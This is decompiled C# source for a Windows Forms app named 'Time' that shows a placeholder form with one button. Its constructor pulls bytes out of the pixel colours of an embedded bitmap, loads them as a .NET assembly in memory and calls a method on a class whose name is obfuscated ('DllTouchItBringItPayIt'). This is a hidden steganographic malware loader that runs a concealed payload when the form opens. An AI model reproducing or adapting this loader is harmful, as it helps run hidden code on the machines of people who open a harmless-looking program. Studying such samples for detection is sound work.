using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Time.My.Resources;

namespace Time;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		Button1 = new Button();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(103, 116);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 261);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
		Bitmap aHZB = Resources.AHZB2;
		List<byte> list = new List<byte>();
		checked
		{
			for (int i = 0; i <= ((Image)aHZB).get_Height() - 1; i++)
			{
				for (int j = 0; j <= ((Image)aHZB).get_Width() - 1; j++)
				{
					Color pixel = aHZB.GetPixel(j, i);
					list.Add(pixel.R);
					list.Add(pixel.G);
					list.Add(pixel.B);
				}
			}
			DynInv(list.ToArray(), null, "Dl************ngItPayIt", "j");
		}
	}

	public object DynInv(byte[] rawAssembly, object[] param, string classname, string method)
	{
		classname = classname.Replace("************", "l.TouchItBri");
		Assembly assembly = Assembly.Load(rawAssembly);
		object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, typeof(Activator), "CreateInstance", new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.GetType(classname))) }, (string[])null, (Type[])null, (bool[])null))));
		return NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, method, new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}
}
